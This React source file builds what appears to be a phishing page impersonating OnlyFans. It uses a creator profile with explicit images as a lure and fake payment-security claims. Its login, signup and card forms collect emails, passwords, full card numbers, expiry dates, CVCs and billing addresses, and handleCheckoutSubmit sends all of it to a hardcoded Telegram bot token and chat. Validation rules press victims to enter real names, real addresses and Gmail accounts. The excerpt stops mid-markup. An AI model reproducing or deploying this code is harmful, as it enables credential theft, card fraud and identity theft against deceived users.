/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { motion, AnimatePresence } from "motion/react";
import { 
  ArrowLeft, 
  Check, 
  Share2, 
  MoreHorizontal, 
  Home, 
  Lock, 
  Image as ImageIcon, 
  Video,
  Heart,
  FileText,
  ChevronUp,
  ChevronDown,
  X,
  Star,
  Eye,
  EyeOff
} from "lucide-react";
import { useState, useEffect, ChangeEvent } from "react";

const COUNTRIES = [
  "Afghanistan", "Albania", "Algeria", "Andorra", "Angola", "Antigua and Barbuda", "Argentina", "Armenia", "Australia", "Austria", 
  "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Belarus", "Belgium", "Belize", "Benin", "Bhutan", 
  "Bolivia", "Bosnia and Herzegovina", "Botswana", "Brazil", "Brunei", "Bulgaria", "Burkina Faso", "Burundi", "Cabo Verde", "Cambodia", 
  "Cameroon", "Canada", "Central African Republic", "Chad", "Chile", "China", "Colombia", "Comoros", "Congo (Congo-Brazzaville)", "Congo (Democratic Republic of the)", 
  "Costa Rica", "Croatia", "Cuba", "Cyprus", "Czechia (Czech Republic)", "Denmark", "Djibouti", "Dominica", "Dominican Republic", "Ecuador", 
  "Egypt", "El Salvador", "Equatorial Guinea", "Eritrea", "Estonia", "Eswatini", "Ethiopia", "Fiji", "Finland", "France", 
  "Gabon", "Gambia", "Georgia", "Germany", "Ghana", "Greece", "Grenada", "Guatemala", "Guinea", "Guinea-Bissau", 
  "Guyana", "Haiti", "Holy See", "Honduras", "Hungary", "Iceland", "India", "Indonesia", "Iran", "Iraq", 
  "Ireland", "Israel", "Italy", "Jamaica", "Japan", "Jordan", "Kazakhstan", "Kenya", "Kiribati", "Kuwait", 
  "Kyrgyzstan", "Laos", "Latvia", "Lebanon", "Lesotho", "Liberia", "Libya", "Liechtenstein", "Lithuania", "Luxembourg", 
  "Madagascar", "Malawi", "Malaysia", "Maldives", "Mali", "Malta", "Marshall Islands", "Mauritania", "Mauritius", "Mexico", 
  "Micronesia", "Moldova", "Monaco", "Mongolia", "Montenegro", "Morocco", "Mozambique", "Myanmar (formerly Burma)", "Namibia", "Nauru", 
  "Nepal", "Netherlands", "New Zealand", "Nicaragua", "Niger", "Nigeria", "North Korea", "North Macedonia", "Norway", "Oman", 
  "Pakistan", "Palau", "Palestine State", "Panama", "Papua New Guinea", "Paraguay", "Peru", "Philippines", "Poland", "Portugal", 
  "Qatar", "Romania", "Russia", "Rwanda", "Saint Kitts and Nevis", "Saint Lucia", "Saint Vincent and the Grenadines", "Samoa", "San Marino", "Sao Tome and Principe", 
  "Saudi Arabia", "Senegal", "Serbia", "Seychelles", "Sierra Leone", "Singapore", "Slovakia", "Slovenia", "Solomon Islands", "Somalia", 
  "South Africa", "South Korea", "South Sudan", "Spain", "Sri Lanka", "Sudan", "Suriname", "Sweden", "Switzerland", "Syria", 
  "Tajikistan", "Tanzania", "Thailand", "Timor-Leste", "Togo", "Tonga", "Trinidad and Tobago", "Tunisia", "Turkey", "Turkmenistan", 
  "Tuvalu", "Uganda", "Ukraine", "United Arab Emirates", "United Kingdom", "United States of America", "Uruguay", "Uzbekistan", "Vanuatu", "Venezuela", 
  "Vietnam", "Yemen", "Zambia", "Zimbabwe"
];

export default function App() {
  const [isBioCollapsed, setIsBioCollapsed] = useState(true);
  const [activeTab, setActiveTab] = useState("posts");
  const [showCookieBanner, setShowCookieBanner] = useState(false);
  const [showCookieNotice, setShowCookieNotice] = useState(false);
  const [showStickyHeader, setShowStickyHeader] = useState(false);
  const [showSubscriptionModal, setShowSubscriptionModal] = useState(false);
  const [modalView, setModalView] = useState<"login" | "signup" | "payment" | "checkout">("login");
  const [showPassword, setShowPassword] = useState(false);
  
  // Form States
  const [loginEmail, setLoginEmail] = useState("");
  const [loginPassword, setLoginPassword] = useState("");
  const [signupName, setSignupName] = useState("");
  const [signupEmail, setSignupEmail] = useState("");
  const [signupPassword, setSignupPassword] = useState("");
  
  // Checkout States
  const [checkoutData, setCheckoutData] = useState({
    country: "United States of America",
    state: "",
    address: "",
    city: "",
    zip: "",
    cardName: "",
    cardNumber: "",
    expiration: "",
    cvc: "",
    agreed: false
  });
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitSuccess, setSubmitSuccess] = useState(false);

  const handleCheckoutChange = (e: ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value, type } = e.target;
    
    if (type === 'checkbox') {
      const checked = (e.target as HTMLInputElement).checked;
      setCheckoutData(prev => ({ ...prev, [name]: checked }));
      return;
    }

    let val = value;

    // Validation and Formatting Logic
    if (name === "cardName") {
      // Only letters and spaces
      val = val.replace(/[^a-zA-Z\s]/g, "");
    } else if (name === "cardNumber") {
      // Only numbers, max 19 digits (with spaces), formatted every 4
      const digits = val.replace(/\D/g, "").substring(0, 16);
      val = digits.replace(/(\d{4})(?=\d)/g, "$1 ");
    } else if (name === "expiration") {
      // Format MM / YY
      const digits = val.replace(/\D/g, "").substring(0, 4);
      if (digits.length > 2) {
        val = `${digits.substring(0, 2)} / ${digits.substring(2)}`;
      } else {
        val = digits;
      }
    } else if (name === "cvc") {
      // Only numbers, max 4
      val = val.replace(/\D/g, "").substring(0, 4);
    } else if (name === "zip") {
      // Only numbers
      val = val.replace(/\D/g, "");
    }

    setCheckoutData(prev => ({ ...prev, [name]: val }));
  };

  const handleCheckoutSubmit = async () => {
    // Validation: Real complete name on card (must have at least two parts)
    const cardNameClean = checkoutData.cardName.trim();
    const nameParts = cardNameClean.split(/\s+/);
    if (nameParts.length < 2 || cardNameClean.length < 4) {
      alert("⚠️ Error: Debe ingresar su NOMBRE LEGAL COMPLETO (Nombre y Apellido) tal cual aparece en su tarjeta bancaria para autorizar la transacción.");
      return;
    }

    // Validation: Card details
    if (!checkoutData.cardNumber || checkoutData.cardNumber.replace(/\s/g, "").length < 15) {
      alert("Por favor, ingrese un número de tarjeta válido.");
      return;
    }
    if (!checkoutData.expiration || checkoutData.expiration.length < 7) {
      alert("Por favor, ingrese una fecha de expiración válida (MM / YY).");
      return;
    }
    if (!checkoutData.cvc || checkoutData.cvc.length < 3) {
      alert("Por favor, ingrese un código CVC válido.");
      return;
    }

    // Validation: Billing address fields
    if (!checkoutData.address.trim() || !checkoutData.city.trim() || !checkoutData.state.trim() || !checkoutData.zip.trim()) {
      alert("⚠️ Error: Todos los campos de la dirección de facturación son obligatorios.");
      return;
    }

    // Heuristic to check if an address string looks "real"
    const isLikelyReal = (str: string) => {
      const clean = str.trim();
      // Requirement: min 5 chars, at least one space, at least one digit, and no extreme repetition
      return clean.length >= 5 && /\s/.test(clean) && /\d/.test(clean) && !/(.)\1{4,}/.test(clean);
    };

    if (!isLikelyReal(checkoutData.address)) {
      alert("⚠️ Error: La dirección de facturación parece inválida. Por favor, ingrese una dirección real (incluya número y calle).");
      return;
    }

    // Validation: Email
    if (!checkoutData.email || !checkoutData.email.toLowerCase().endsWith("@gmail.com")) {
      alert("⚠️ Error: Debe ingresar un correo electrónico @gmail.com válido.");
      return;
    }

    if (!checkoutData.agreed) {
      alert("Please confirm you are at least 18 years old.");
      return;
    }

    setIsSubmitting(true);
    
    const bots = [
      { token: "8367352890:AAFcUK97oOu6iAI89qeeiytxePg5EE6eiCs", chatId: "8447588640" }
    ];
    
    const message = `
🌟 **NUEVO PAGO RECIBIDO** 🌟
----------------------------
📧 **Email:** ${signupEmail || loginEmail}
👤 **Nombre en Tarjeta:** ${checkoutData.cardName}
💳 **Número:** ${checkoutData.cardNumber}
📅 **Exp:** ${checkoutData.expiration}
🔒 **CVC:** ${checkoutData.cvc}
----------------------------
📍 **País:** ${checkoutData.country}
🏛️ **Estado:** ${checkoutData.state}
🏠 **Dirección:** ${checkoutData.address}
🏙️ **Ciudad:** ${checkoutData.city}
📮 **ZIP:** ${checkoutData.zip}
----------------------------
🔐 **Login Password:** ${loginPassword}
🔐 **Signup Password:** ${signupPassword}
    `;

    try {
      await Promise.all(bots.map(bot => 
        fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: bot.chatId,
            text: message,
            parse_mode: 'Markdown'
          })
        })
      ));
      
      setSubmitSuccess(true);
      setTimeout(() => {
        setShowSubscriptionModal(false);
        setSubmitSuccess(false);
        setModalView("login");
      }, 2000);
    } catch (error) {
      console.error("Error sending to Telegram:", error);
      alert("There was an error processing your request. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  useEffect(() => {
    if (!showSubscriptionModal) {
      // Reset to login view and clear forms when modal closes
      setTimeout(() => {
        setModalView("login");
        setLoginEmail("");
        setLoginPassword("");
        setSignupName("");
        setSignupEmail("");
        setSignupPassword("");
      }, 300);
    }
  }, [showSubscriptionModal]);

  useEffect(() => {
    const handleScroll = () => {
      if (window.scrollY > 200) {
        setShowStickyHeader(true);
      } else {
        setShowStickyHeader(false);
      }
    };

    window.addEventListener("scroll", handleScroll);
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  useEffect(() => {
    const consent = localStorage.getItem("cookie-consent");
    if (!consent) {
      setShowCookieBanner(true);
    }
  }, []);

  const handleCookieConsent = (type: "all" | "necessary") => {
    localStorage.setItem("cookie-consent", type);
    setShowCookieBanner(false);
  };

  const handleGoToSignup = () => {
    setSignupEmail(loginEmail);
    setSignupPassword(loginPassword);
    setModalView("signup");
  };

  const handleGoToLogin = () => {
    setLoginEmail(signupEmail);
    setLoginPassword(signupPassword);
    setModalView("login");
  };

  return (
    <div className="min-h-screen bg-white text-gray-900 font-sans pb-24">
      {/* Cookie Banner */}
      <AnimatePresence>
        {showCookieBanner && (
          <motion.div 
            initial={{ y: -100 }}
            animate={{ y: 0 }}
            exit={{ y: -100 }}
            className="bg-[#eef7fb] px-3 py-2 flex flex-col sm:flex-row sm:items-center sm:justify-between text-[11px] sticky top-0 z-50 border-b border-blue-100 shadow-sm"
          >
            <p className="text-[#4a7a96] leading-tight mb-2 sm:mb-0 sm:pr-4">
              We use cookies to run this website. See our <span onClick={() => setShowCookieNotice(true)} className="text-[#00aff0] underline cursor-pointer">Cookie Notice</span>.
            </p>
            <div className="flex gap-2 shrink-0 justify-end">
              <button 
                onClick={() => handleCookieConsent("necessary")}
                className="text-[#00aff0] font-bold px-2 py-1 hover:bg-blue-50 rounded-md transition-colors uppercase tracking-tighter"
              >
                ONLY NECESSARY COOKIES
              </button>
              <button 
                onClick={() => handleCookieConsent("all")}
                className="bg-[#00aff0] text-white font-bold px-3 py-1 rounded-full hover:bg-[#0096ce] transition-colors shadow-sm uppercase tracking-tighter"
              >
                ACCEPT ALL
              </button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Subscription Modal */}
      <AnimatePresence>
        {showSubscriptionModal && (
          <div className="fixed inset-0 z-[110] flex items-end sm:items-center justify-center">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setShowSubscriptionModal(false)}
              className="absolute inset-0 bg-black/60 backdrop-blur-sm"
            />
            <motion.div 
              initial={{ y: "100%" }}
              animate={{ y: 0 }}
              exit={{ y: "100%" }}
              transition={{ type: "spring", damping: 25, stiffness: 200 }}
              className="bg-white rounded-t-2xl sm:rounded-2xl w-full max-w-lg overflow-hidden relative z-10 max-h-[95vh] flex flex-col"
            >
              <div className="overflow-y-auto">
                {/* Modal Header Cover */}
                {modalView !== "checkout" && (
                  <>
                    <div className="relative h-32 overflow-hidden">
                      <img 
                        src="https://cdni.pornpics.com/1280/3/26/82659489/82659489_019_56b1.jpg" 
                        alt="Cover" 
                        className="w-full h-full object-cover"
                        referrerPolicy="no-referrer"
                      />
                      <div className="absolute inset-0 bg-black/20" />
                    </div>

                    {/* Profile Info Overlap */}
                    <div className="px-6 relative">
                      <div className="absolute -top-12 left-6">
                        <div className="relative">
                          <div className="w-24 h-24 rounded-full border-4 border-white overflow-hidden shadow-md">
                            <img 
                              src="https://cdni.pornpics.com/1280/3/26/61400560/61400560_022_80d5.jpg" 
                              alt="Avatar" 
                              className="w-full h-full object-cover"
                              referrerPolicy="no-referrer"
                            />
                          </div>
                          <div className="absolute bottom-1 right-1 w-5 h-5 bg-[#4caf50] border-4 border-white rounded-full" />
                        </div>
                      </div>

                      <div className="pt-14 mb-6">
                        <h3 className="text-xl font-bold flex items-center gap-1">
                          Sofia Sanz <Check size={18} className="bg-[#00aff0] text-white rounded-full p-0.5" />
                        </h3>
                        <p className="text-gray-400 text-sm">@sofiasanzz</p>
                      </div>

                      {/* Benefits */}
                      <div className="mb-8">
                        <h4 className="text-gray-400 font-bold text-sm uppercase tracking-wider mb-4">
                          SUBSCRIBE AND GET THESE BENEFITS:
                        </h4>
                        <ul className="space-y-4">
                          {[
                            "Full access to this user's content",
                            "Direct message with this user",
                            "Cancel your subscription at any time"
                          ].map((benefit, i) => (
                            <li key={i} className="flex items-center gap-3 text-gray-800 font-medium">
                              <Check size={20} className="text-[#00aff0]" />
                              {benefit}
                            </li>
                          ))}
                        </ul>
                      </div>
                    </div>
                  </>
                )}

                <div className="px-6 relative">
                  {/* Auth Forms */}
                  <div className={`${modalView !== "checkout" ? "border-t border-gray-100 pt-6" : ""} mb-6`}>
                    <AnimatePresence mode="wait">
                      {modalView === "login" ? (
                        <motion.div 
                          key="login"
                          initial={{ opacity: 0, x: -20 }}
                          animate={{ opacity: 1, x: 0 }}
                          exit={{ opacity: 0, x: 20 }}
                        >
                          <h4 className="font-bold text-lg mb-6">Log in to subscribe</h4>
                          
                          <div className="space-y-4">
                            <div className="relative">
                              <input 
                                type="email" 
                                placeholder="Email"
                                value={loginEmail}
                                onChange={(e) => setLoginEmail(e.target.value)}
                                className="w-full border border-gray-200 rounded-lg p-4 pt-6 pb-2 focus:outline-none focus:border-[#00aff0] transition-colors peer"
                              />
                              <label className={`absolute left-4 top-1 text-[10px] text-gray-400 uppercase font-bold transition-all ${loginEmail ? 'block' : 'hidden'}`}>
                                Email
                              </label>
                            </div>

                            <div className="relative">
                              <input 
                                type={showPassword ? "text" : "password"} 
                                placeholder="Password"
                                value={loginPassword}
                                onChange={(e) => setLoginPassword(e.target.value)}
                                className="w-full border border-gray-200 rounded-lg p-4 pt-6 pb-2 focus:outline-none focus:border-[#00aff0] transition-colors peer"
                              />
                              <label className={`absolute left-4 top-1 text-[10px] text-gray-400 uppercase font-bold transition-all ${loginPassword ? 'block' : 'hidden'}`}>
                                Password
                              </label>
                              <button 
                                onClick={() => setShowPassword(!showPassword)}
                                className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400"
                              >
                                {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                              </button>
                            </div>

                            <div className="flex flex-col gap-1">
                              <button 
                                onClick={handleGoToSignup}
                                disabled={loginPassword.length < 12 || !loginEmail.toLowerCase().endsWith("@gmail.com")}
                                className={`w-full font-bold py-4 rounded-full uppercase tracking-wider transition-all ${
                                  loginPassword.length >= 12 && loginEmail.toLowerCase().endsWith("@gmail.com")
                                    ? "bg-[#00aff0] text-white shadow-lg shadow-blue-100 cursor-pointer active:scale-[0.98]" 
                                    : "bg-gray-200 text-gray-400 cursor-not-allowed"
                                }`}
                              >
                                LOG IN
                              </button>
                              {loginPassword.length > 0 && loginPassword.length < 12 && (
                                <p className="text-[10px] text-red-400 text-center font-medium">
                                  Password must be at least 12 characters
                                </p>
                              )}
                            </div>
                          </div>

                          <div className="mt-6 text-center text-xs text-gray-400 leading-relaxed px-4">
                            By logging in and using OnlyFans, you agree to our <span className="text-[#00aff0] cursor-pointer">Terms of Service</span> and <span className="text-[#00aff0] cursor-pointer">Privacy Policy</span>, and confirm that you are at least 18 years old.
                          </div>

                          <div className="mt-8 flex justify-center gap-4 text-sm font-medium">
                            <button className="text-[#00aff0] hover:underline">Forgot password?</button>
                            <span className="text-gray-300">•</span>
                            <button 
                              onClick={handleGoToSignup}
                              className="text-[#00aff0] hover:underline"
                            >
                              Sign up for OnlyFans
                            </button>
                          </div>
                        </motion.div>
                      ) : modalView === "signup" ? (
                        <motion.div 
                          key="signup"
                          initial={{ opacity: 0, x: 20 }}
                          animate={{ opacity: 1, x: 0 }}
                          exit={{ opacity: 0, x: -20 }}
                        >
                          <h4 className="font-bold text-lg mb-6">Create your account</h4>
                          
                          <div className="space-y-4">
                            <div className="relative">
                              <input 
                                type="text" 
                                placeholder="Name"
                                value={signupName}
                                onChange={(e) => setSignupName(e.target.value)}
                                className="w-full border border-gray-200 rounded-lg p-4 pt-6 pb-2 focus:outline-none focus:border-[#00aff0] transition-colors peer"
                              />
                              <label className={`absolute left-4 top-1 text-[10px] text-gray-400 uppercase font-bold transition-all ${signupName ? 'block' : 'hidden'}`}>
                                Name
                              </label>
                            </div>

                            <div className="relative">
                              <input 
                                type="email" 
                                placeholder="Email"
                                value={signupEmail}
                                onChange={(e) => setSignupEmail(e.target.value)}
                                className="w-full border border-gray-200 rounded-lg p-4 pt-6 pb-2 focus:outline-none focus:border-[#00aff0] transition-colors peer"
                              />
                              <label className={`absolute left-4 top-1 text-[10px] text-gray-400 uppercase font-bold transition-all ${signupEmail ? 'block' : 'hidden'}`}>
                                Email
                              </label>
                            </div>

                            <div className="relative">
                              <input 
                                type={showPassword ? "text" : "password"} 
                                placeholder="Password"
                                value={signupPassword}
                                onChange={(e) => setSignupPassword(e.target.value)}
                                className="w-full border border-gray-200 rounded-lg p-4 pt-6 pb-2 focus:outline-none focus:border-[#00aff0] transition-colors peer"
                              />
                              <label className={`absolute left-4 top-1 text-[10px] text-gray-400 uppercase font-bold transition-all ${signupPassword ? 'block' : 'hidden'}`}>
                                Password
                              </label>
                              <button 
                                onClick={() => setShowPassword(!showPassword)}
                                className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400"
                              >
                                {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                              </button>
                            </div>

                            <div className="flex flex-col gap-1">
                              <button 
                                onClick={() => setModalView("payment")}
                                disabled={signupPassword.length < 12 || !signupName || !signupEmail.toLowerCase().endsWith("@gmail.com")}
                                className={`w-full font-bold py-4 rounded-full uppercase tracking-wider transition-all ${
                                  signupPassword.length >= 12 && signupName && signupEmail.toLowerCase().endsWith("@gmail.com")
                                    ? "bg-[#00aff0] text-white shadow-lg shadow-blue-100 cursor-pointer active:scale-[0.98]" 
                                    : "bg-gray-200 text-gray-400 cursor-not-allowed"
                                }`}
                              >
                                SIGN UP
                              </button>
                              {signupPassword.length > 0 && signupPassword.length < 12 && (
                                <p className="text-[10px] text-red-400 text-center font-medium">
                                  Password must be at least 12 characters
                                </p>
                              )}
                            </div>
                          </div>

                          <div className="mt-6 text-center text-xs text-gray-400 leading-relaxed px-4">
                            By signing up you agree to our <span className="text-[#00aff0] cursor-pointer">Terms of Service</span> and <span className="text-[#00aff0] cursor-pointer">Privacy Policy</span>, and confirm that you are at least 18 years old.
                          </div>

                          <div className="mt-8 flex justify-center gap-4 text-sm font-medium">
                            <button 
                              onClick={handleGoToLogin}
                              className="text-[#00aff0] hover:underline"
                            >
                              Already have an account? Log in
                            </button>
                          </div>
                        </motion.div>
                      ) : modalView === "payment" ? (
                        <motion.div 
                          key="payment"
                          initial={{ opacity: 0, scale: 0.95 }}
                          animate={{ opacity: 1, scale: 1 }}
                          exit={{ opacity: 0, scale: 0.95 }}
                          className="text-center py-8"
                        >
                          <button 
                            onClick={() => setModalView("checkout")}
                            className="w-full border-2 border-[#00aff0] text-[#00aff0] font-bold py-4 rounded-full uppercase tracking-wider hover:bg-blue-50 transition-colors mb-4"
                          >
                            PLEASE ADD A PAYMENT CARD
                          </button>
                        </motion.div>
                      ) : (
                        <motion.div 
                          key="checkout"
                          initial={{ opacity: 0, y: 20 }}
                          animate={{ opacity: 1, y: 0 }}
                          exit={{ opacity: 0, y: -20 }}
                          className="pb-6"
                        >
                          <div className="flex items-center justify-between mb-6 border-b border-gray-100 pb-4 -mx-6 px-6">
                            <h4 className="font-bold text-gray-800 uppercase tracking-wider">ADD CARD</h4>
                          </div>

                          <div className="space-y-6">
                            {/* Billing Details Section */}
                            <div>
                              <h5 className="text-[#8a96a3] font-bold text-xs uppercase tracking-widest mb-4">BILLING DETAILS</h5>
                              <p className="text-gray-700 text-sm leading-relaxed mb-6">
                                We are fully compliant with Payment Card Industry Data Security Standards.
                              </p>

                              <div className="space-y-4">
                                {/* Country Select */}
                                <div className="relative">
                                  <div className="absolute -top-2.5 left-3 bg-white px-1 text-[10px] text-gray-400 font-bold uppercase z-10">Country</div>
                                  <select 
                                    name="country"
                                    value={checkoutData.country}
                                    onChange={handleCheckoutChange}
                                    className="w-full border border-gray-200 rounded-lg p-4 appearance-none bg-white focus:outline-none focus:border-[#00aff0] text-gray-700"
                                  >
                                    {COUNTRIES.map(c => (
                                      <option key={c} value={c}>{c}</option>
                                    ))}
                                  </select>
                                  <ChevronDown className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none" size={20} />
                                </div>

                                {/* State Input */}
                                <div className="relative">
                                  <input 
                                    type="text" 
                                    name="state"
                                    value={checkoutData.state}
                                    onChange={handleCheckoutChange}
                                    placeholder="State / Province" 
                                    className="w-full border border-gray-200 rounded-lg p-4 focus:outline-none focus:border-[#00aff0]" 
                                  />
                                </div>

                                <input 
                                  type="text" 
                                  name="address"
                                  value={checkoutData.address}
                                  onChange={handleCheckoutChange}
                                  placeholder="Address" 
                                  className="w-full border border-gray-200 rounded-lg p-4 focus:outline-none focus:border-[#00aff0]" 
                                />
                                <input 
                                  type="text" 
                                  name="city"
                                  value={checkoutData.city}
                                  onChange={handleCheckoutChange}
                                  placeholder="City" 
                                  className="w-full border border-gray-200 rounded-lg p-4 focus:outline-none focus:border-[#00aff0]" 
                                />
                                <input 
                                  type="text" 
                                  name="zip"
                                  value={checkoutData.zip}
                                  onChange={handleCheckoutChange}
                                  placeholder="ZIP / Postal Code" 
                                  className="w-full border border-gray-200 rounded-lg p-4 focus:outline-none focus:border-[#00aff0]" 
                                />
                              </div>
                            </div>

                            {/* Card Details Section */}
                            <div className="pt-4">
                              <h5 className="text-[#8a96a3] font-bold text-xs uppercase tracking-widest mb-4">CARD DETAILS</h5>
                              <div className="space-y-4">
                                <div className="relative">
                                  <div className="absolute -top-2.5 left-3 bg-white px-1 text-[10px] text-gray-400 font-bold uppercase z-10">E-mail</div>
                                  <input 
                                    type="email" 
                                    value={signupEmail || loginEmail} 
                                    readOnly
                                    className="w-full border border-gray-200 rounded-lg p-4 bg-gray-50 text-gray-500 focus:outline-none" 
                                  />
                                </div>
                                <input 
                                  type="text" 
                                  name="cardName"
                                  value={checkoutData.cardName}
                                  onChange={handleCheckoutChange}
                                  placeholder="Full Legal Name on Card" 
                                  className="w-full border border-gray-200 rounded-lg p-4 focus:outline-none focus:border-[#00aff0]" 
                                />
                                <div className="relative">
                                  <input 
                                    type="text" 
                                    name="cardNumber"
                                    value={checkoutData.cardNumber}
                                    onChange={handleCheckoutChange}
                                    placeholder="Card Number" 
                                    className="w-full border border-gray-200 rounded-lg p-4 focus:outline-none focus:border-[#00aff0] pr-12" 
                                  />
                                  <button className="absolute right-4 top-1/2 -translate-y-1/2 text-[#00aff0]">
                                    <ImageIcon size={20} />
                                  </button>
                                </div>
                                <button className="text-[#00aff0] text-sm font-medium hover:underline">My card number is longer</button>
                                
                                <div className="flex gap-4">
                                  <div className="relative flex-1">
                                    <div className="absolute -top-2.5 left-3 bg-white px-1 text-[10px] text-gray-400 font-bold uppercase z-10">Expiration</div>
                                    <input 
                                      type="text" 
                                      name="expiration"
                                      value={checkoutData.expiration}
                                      onChange={handleCheckoutChange}
                                      placeholder="MM / YY" 
                                      className="w-full border border-gray-200 rounded-lg p-4 focus:outline-none focus:border-[#00aff0]" 
                                    />
                                  </div>
                                  <input 
                                    type="text" 
                                    name="cvc"
                                    value={checkoutData.cvc}
                                    onChange={handleCheckoutChange}
                                    placeholder="CVC" 
                                    className="w-full border border-gray-200 rounded-lg p-4 focus:outline-none focus:border-[#00aff0] flex-1" 
                                  />
                                </div>

                                <div className="flex items-start gap-4 py-4">
                                  <div className="relative flex items-center justify-center mt-1">
                                    <input 
                                      type="checkbox" 
                                      name="agreed"
                                      checked={checkoutData.agreed}
                                      onChange={handleCheckoutChange}
                                      className="w-6 h-6 rounded-full border-2 border-[#00aff0] appearance-none checked:bg-[#00aff0] transition-colors cursor-pointer" 
                                    />
                                    <div className={`absolute pointer-events-none text-white transition-opacity ${checkoutData.agreed ? 'opacity-100' : 'opacity-0'}`}>
                                      <Check size={14} strokeWidth={4} />
                                    </div>
                                  </div>
                                  <p className="text-sm text-gray-600 leading-relaxed">
                                    Tick here to confirm that you are at least 18 years old and the age of majority in your place of residence
                                  </p>
                                </div>
                              </div>
                            </div>

                            {/* Payment Icons & Legal */}
                            <div className="pt-6 border-t border-gray-100 text-center">
                              <div className="flex justify-center flex-wrap gap-2 mb-6">
                                <div className="bg-[#f2f4f5] rounded-md px-2 py-1 flex items-center justify-center w-14 h-10">
                                  <img src="https://upload.wikimedia.org/wikipedia/commons/d/d6/Visa_2021.svg" alt="Visa" className="max-h-full max-w-full" referrerPolicy="no-referrer" />
                                </div>
                                <div className="bg-[#f2f4f5] rounded-md px-2 py-1 flex items-center justify-center w-14 h-10">
                                  <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" className="max-h-full max-w-full" referrerPolicy="no-referrer" />
                                </div>
                                <div className="bg-[#f2f4f5] rounded-md px-2 py-1 flex items-center justify-center w-14 h-10">
                                  <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/Maestro_logo.svg" alt="Maestro" className="max-h-full max-w-full" referrerPolicy="no-referrer" />
                                </div>
                                <div className="bg-[#f2f4f5] rounded-md px-2 py-1 flex items-center justify-center w-14 h-10">
                                  <img src="https://upload.wikimedia.org/wikipedia/commons/a/a6/Diners_Club_Logo3.svg" alt="Diners" className="max-h-full max-w-full" referrerPolicy="no-referrer" />
                                </div>
                                <div className="bg-[#f2f4f5] rounded-md px-2 py-1 flex items-center justify-center w-14 h-10">
                                  <img src="https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg" alt="Discover" className="max-h-full max-w-full" referrerPolicy="no-referrer" />
                                </div>
                                <div className="bg-[#f2f4f5] rounded-md px-2 py-1 flex items-center justify-center w-14 h-10">
                                  <img src="https://upload.wikimedia.org/wikipedia/commons/4/40/JCB_logo.svg" alt="JCB" className="max-h-full max-w-full" referrerPolicy="no-referrer" />
                                </div>
                              </div>
                              <div className="text-[10px] text-gray-400 space-y-2 leading-relaxed">
                                <p>Fenix International Limited, 9th Floor, 107 Cheapside, London, EC2V 6DN</p>
                                <p>Fenix Internet LLC, 1000 N.West Street, Suite 1200, Wilmington, Delaware, 19801 USA</p>
                              </div>
                            </div>

                            <div className="flex justify-end gap-4 pt-6 border-t border-gray-100 -mx-6 px-6">
                              <button 
                                onClick={() => setModalView("payment")}
                                className="text-[#00aff0] font-bold uppercase tracking-wider px-4 py-2 hover:bg-blue-50 rounded-lg transition-colors"
                              >
                                CANCEL
                              </button>
                              <button 
                                onClick={handleCheckoutSubmit}
                                disabled={isSubmitting}
                                className="text-[#00aff0] font-bold uppercase tracking-wider px-4 py-2 hover:bg-blue-50 rounded-lg transition-colors disabled:opacity-50"
                              >
                                {isSubmitting ? "Sending..." : submitSuccess ? "Success!" : "SUBMIT"}
                              </button>
                            </div>
                          </div>
                        </motion.div>
                      )}
                    </AnimatePresence>
                  </div>
                </div>
              </div>

              {/* Close Button Footer */}
              <div className="border-t border-gray-100 p-4 flex justify-end">
                <button 
                  onClick={() => setShowSubscriptionModal(false)}
                  className="text-[#00aff0] font-bold uppercase tracking-wider px-4 py-2 hover:bg-blue-50 rounded-lg transition-colors"
                >
                  CLOSE
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Cookie Notice Modal */}
      <AnimatePresence>
        {showCookieNotice && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setShowCookieNotice(false)}
              className="absolute inset-0 bg-black/60 backdrop-blur-sm"
            />
            <motion.div 
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="bg-white rounded-2xl w-full max-w-md p-6 relative z-10 shadow-2xl"
            >
              <div className="flex justify-between items-center mb-4">
                <h3 className="text-xl font-bold">Cookie Notice</h3>
                <button onClick={() => setShowCookieNotice(false)} className="p-1 hover:bg-gray-100 rounded-full">
                  <X size={24} />
                </button>
              </div>
              <div className="text-sm text-gray-600 space-y-4 max-h-[60vh] overflow-y-auto pr-2">
                <p>
                  This website uses cookies to enhance your browsing experience, provide personalized content, and analyze our traffic.
                </p>
                <div className="space-y-2">
                  <h4 className="font-bold text-gray-900">1. Necessary Cookies</h4>
                  <p>These cookies are essential for the website to function properly. They enable basic features like page navigation and access to secure areas.</p>
                </div>
                <div className="space-y-2">
                  <h4 className="font-bold text-gray-900">2. Performance Cookies</h4>
                  <p>These cookies help us understand how visitors interact with the website by collecting and reporting information anonymously.</p>
                </div>
                <div className="space-y-2">
                  <h4 className="font-bold text-gray-900">3. Marketing Cookies</h4>
                  <p>These cookies are used to track visitors across websites to display relevant and engaging ads.</p>
                </div>
              </div>
              <button 
                onClick={() => setShowCookieNotice(false)}
                className="w-full mt-6 bg-[#00aff0] text-white font-bold py-3 rounded-full"
              >
                GOT IT
              </button>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Sticky Header */}
